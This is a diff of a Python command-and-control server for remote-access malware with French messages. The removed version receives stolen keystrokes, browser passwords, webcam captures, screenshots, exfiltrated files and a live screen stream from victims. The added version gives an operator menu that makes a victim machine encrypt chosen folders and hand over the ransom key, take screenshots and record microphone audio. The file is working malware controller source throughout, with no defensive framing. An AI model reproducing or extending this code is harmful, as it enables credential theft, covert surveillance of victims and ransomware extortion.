@@ -1,133 +1,70 @@
 import socket
-import threading
-import sqlite3
-from datetime import datetime
 import os
-import json
-import struct
-import pickle
-from PIL import Image
-import io
-import cv2
-import numpy as np
-import time
+from datetime import datetime
 
-
-SERVER_HOST = '0.0.0.0'
-SERVER_PORT = 4444
-DB_PATH = "../bdd/rat.db"
-KEYLOG_DIR = "keylogs"
+HOST = "0.0.0.0"
+PORT = 5001
 CAPTURE_DIR = "captures"
-EXFIL_DIR = "exfiltrated_files"
+EXFIL_DIR = "donnees_windows"
+AUDIO_DIR = "audio_captures"
+KEY_FILE = "ransom_key_received.key"
 
-os.makedirs(EXFIL_DIR, exist_ok=True)
+def save_key(data):
+    with open(KEY_FILE, "wb") as f:
+        f.write(data)
+    print(f"[+] Clé reçue et enregistrée dans {KEY_FILE}")
 
-REMOTE_PORT = 5555
-SCREEN_PORT = 5001
+def list_captures():
+    files = os.listdir(CAPTURE_DIR) if os.path.exists(CAPTURE_DIR) else []
+    if files:
+        print("[+] Captures :")
+        for f in files:
+            print(" -", f)
+    else:
+        print("[!] Aucune capture.")
 
+def list_audio_files():
+    files = os.listdir(AUDIO_DIR) if os.path.exists(AUDIO_DIR) else []
+    if files:
+        print("[+] Fichiers audio reçus :")
+        for f in files:
+            print(" -", f)
+    else:
+        print("[!] Aucun fichier audio reçu.")
 
-def remote_view():
-    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    remote_socket.bind((SERVER_HOST, REMOTE_PORT))
-    remote_socket.listen(1)
-    print("[*] Remote stream en attente de connexion...")
+def receive_audio(conn):
+    header = conn.recv(128)
+    decoded = header.decode(errors="ignore")
 
-    conn, addr = remote_socket.accept()
-    print(f"[+] Remote stream connecté : {addr}")
+    if header.startswith(b"voice:"):
+        print(f"[DEBUG] Header reçu : {decoded}")
+        parts = decoded.split(":")
+        if len(parts) >= 3:
+            filename = parts[1]
+            filesize = int(parts[2])
+            save_path = os.path.abspath(os.path.join(AUDIO_DIR, filename))
+            print(f"[DEBUG] Sauvegarde du fichier audio dans : {save_path}")
 
-    try:
-        while True:
-            raw_size = conn.recv(4)
-            if not raw_size:
-                break
-            size = struct.unpack("!I", raw_size)[0]
-            data = b""
-            while len(data) < size:
-                packet = conn.recv(size - len(data))
-                if not packet:
-                    break
-                data += packet
-            frame_data = pickle.loads(data)
-            width, height = frame_data['size']
-            rgb = frame_data['rgb']
-            frame_np = np.frombuffer(rgb, dtype=np.uint8).reshape((height, width, 3))
-            cv2.imshow("REMOTE ACCESS LIVE", frame_np)
-            if cv2.waitKey(1) & 0xFF == ord('q'):
-                break
-    except Exception as e:
-        print(f"[!] Remote error: {e}")
-    finally:
-        conn.close()
-        remote_socket.close()
-        cv2.destroyAllWindows()
-
-# Création des dossiers nécessaires
-os.makedirs(KEYLOG_DIR, exist_ok=True)
-os.makedirs(CAPTURE_DIR, exist_ok=True)
-
-# Connexion à la base de données
-conn = sqlite3.connect(DB_PATH, check_same_thread=False)
-cursor = conn.cursor()
-
-clients = {}
-
-def save_to_db(file_type, client_ip, data, file_path=None):
-    """Sauvegarde des données dans la base de données."""
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    if file_type == "keystroke":
-        cursor.execute("INSERT INTO keystrokes (timestamp, target_ip, key_pressed) VALUES (?, ?, ?)", (timestamp, client_ip, data))
-    elif file_type == "passwords":
-        for pwd in data:
-            cursor.execute("INSERT INTO passwords (target_ip, timestamp, url, username, password) VALUES (?, ?, ?, ?, ?)",
-                           (client_ip, timestamp, pwd['url'], pwd['username'], pwd['password']))
-    elif file_type == "webcam_capture":
-        cursor.execute("INSERT INTO webcam (timestamp, target_ip, file_path) VALUES (?, ?, ?)", (timestamp, client_ip, file_path))
-    conn.commit()
-
-def process_data(data, client_ip):
-    """Traitement des données reçues du client."""
-    try:
-        parsed_data = json.loads(data)
-        file_type = parsed_data.get("type")
-        file_data = parsed_data.get("data")
-        filename = parsed_data.get("filename", "")
-
-        if file_type == "keystroke":
-            file_path = os.path.join(KEYLOG_DIR, filename)
-            with open(file_path, "wb") as f:
-                f.write(bytes.fromhex(file_data))
-            save_to_db(file_type, client_ip, file_data, file_path)
-
-        elif file_type == "passwords":
-            save_to_db(file_type, client_ip, file_data)
-
-        elif file_type == "webcam_capture":
-            file_path = os.path.join(CAPTURE_DIR, filename)
-            with open(file_path, "wb") as f:
-                f.write(bytes.fromhex(file_data))
-            save_to_db(file_type, client_ip, file_data, file_path)
-            
-        elif file_type == "screenshot":
-            screenshot_dir = "screenshot"
-            os.makedirs(screenshot_dir, exist_ok=True)
-            file_path = os.path.join(screenshot_dir, filename)
-            with open(file_path, "wb") as f:
-                f.write(bytes.fromhex(file_data))
-            print(f"[+] Screenshot sauvegardé dans : {file_path}")       
-
-        print(f"[+] Données '{file_type}' reçues et sauvegardées de {client_ip}")
-
-    except Exception as e:
-        print(f"[Erreur] lors du traitement des données : {e}")
-
-
+            with open(save_path, "wb") as f:
+                received = 0
+                while received < filesize:
+                    chunk = conn.recv(min(4096, filesize - received))
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                    received += len(chunk)
+            print(f"[+] Fichier audio reçu et sauvegardé ici : {save_path}")
+        else:
+            print("[!] Erreur de format de header pour voice:")
+    else:
+        print("[!] Aucun header voice reçu.")
 
 def receive_file(conn, dest_dir, prefix):
     header = conn.recv(128)
     decoded = header.decode(errors="ignore")
     if header.startswith(prefix.encode()):
         parts = decoded.split(":")
-        if len(parts) >= 3:
+        if len(parts) > 3:
             filename = parts[1]
             filesize = int(parts[2])
             os.makedirs(dest_dir, exist_ok=True)
@@ -146,75 +83,79 @@ def receive_file(conn, dest_dir, prefix):
     else:
         print(f"[!] Header inattendu (pas {prefix}) : {decoded}")
 
+def start_server():
+    os.makedirs(CAPTURE_DIR, exist_ok=True)
+    os.makedirs(EXFIL_DIR, exist_ok=True)
+    os.makedirs(AUDIO_DIR, exist_ok=True)
 
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+        server.bind((HOST, PORT))
+        server.listen(1)
+        print(f"[+] Serveur en écoute sur {HOST}:{PORT}")
+        conn, addr = server.accept()
+        print(f"[+] Connexion établie avec {addr}")
 
-def handle_client(client_socket, client_address):
-    """Gestion des connexions clients."""
-    print(f"[+] Connexion de {client_address}")
-    clients[client_address] = client_socket
-
-    try:
         while True:
-            header = client_socket.recv(128)
-            if not header:
+            print("\n[ Menu ]")
+            print("1 - Lister les dossiers et chiffrer un dossier")
+            print("2 - Lister et déchiffrer un dossier")
+            print("3 - Capture d’écran")
+            print("4 - Afficher les captures")
+            print("5 - Enregistrer audio depuis le micro")
+            print("6 - Quitter")
+            print("7 - Afficher les fichiers audio reçus")
+
+            choice = input("Choix : ")
+
+            if choice == "1":
+                conn.sendall(b"listdirs")
+                print("[+] Listing des dossiers…")
+                data = conn.recv(8192).decode()
+                print(data)
+                selected = input("Dossier à chiffrer : ").strip()
+                conn.sendall(f"encrypt:{selected}".encode())
+                print(conn.recv(1024).decode())
+
+            elif choice == "2":
+                conn.sendall(b"key_request")
+                print("[+] Requête de clé…")
+                while True:
+                    response = conn.recv(8192)
+                    if not response.startswith(b"key:"):
+                        break
+                    save_key(response[4:])
+                print(response.decode())
+                selected = input("Dossier à déchiffrer : ").strip()
+                conn.sendall(f"decrypt:{selected}".encode())
+                print(conn.recv(1024).decode())
+
+            elif choice == "3":
+                conn.sendall(b"screenshot")
+                size_data = conn.recv(16)
+                total_size = int(size_data.decode().strip())
+                received_data = b""
+                while len(received_data) < total_size:
+                    received_data += conn.recv(4096)
+                filename = f"{CAPTURE_DIR}/capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+                with open(filename, "wb") as f:
+                    f.write(received_data)
+                print(f"[+] Capture sauvegardée : {filename}")
+
+            elif choice == "4":
+                list_captures()
+
+            elif choice == "5":
+                conn.sendall(b"voice")
+                print("[+] Enregistrement vocal déclenché.")
+                receive_audio(conn)
+
+            elif choice == "6":
+                conn.sendall(b"exit")
+                print("[+] Fermeture du serveur.")
                 break
 
-            if header.startswith(b"exfil:"):
-                receive_file(client_socket, EXFIL_DIR, "exfil")
+            elif choice == "7":
+                list_audio_files()
 
-            else:
-                # Cas classique : JSON (keystroke, webcam, etc.)
-                remaining = client_socket.recv(1048576)
-                full_data = header + remaining
-                process_data(full_data.decode("utf-8", errors="ignore"), client_address[0])
-
-    except Exception as e:
-        print(f"[!] Erreur avec le client {client_address} : {e}")
-    finally:
-        client_socket.close()
-        del clients[client_address]
-        print(f"[-] Déconnexion de {client_address}")
-
-
-
-
-def accept_connections():
-    """Accepter les connexions entrantes."""
-    while True:
-        client_socket, client_address = server_socket.accept()
-        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
-
-
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind((SERVER_HOST, SERVER_PORT))
-server_socket.listen(5)
-print(f"[*] Serveur en écoute sur {SERVER_HOST}:{SERVER_PORT}...")
-
-
-threading.Thread(target=accept_connections, daemon=True).start()
-
-try:
-    while True:
-        command = input("Admin > ").strip()
-        if command == "exit":
-            break
-
-        elif command == "remote":
-            threading.Thread(target=remote_view, daemon=True).start()
-            time.sleep(1.5)  # Attendre lecoute du port 5555
-            for client in clients.values():
-                client.send(command.encode('utf-8'))
-
-        elif command:
-            for client in clients.values():
-                client.send(command.encode('utf-8'))
-
-
-        
-except KeyboardInterrupt:
-    print("\n[!] Arrêt du serveur par l'utilisateur.")
-finally:
-    server_socket.close()
-    conn.close()
-    print("[*] Serveur arrêté proprement.")
-
+if __name__ == "__main__":
+    start_server()
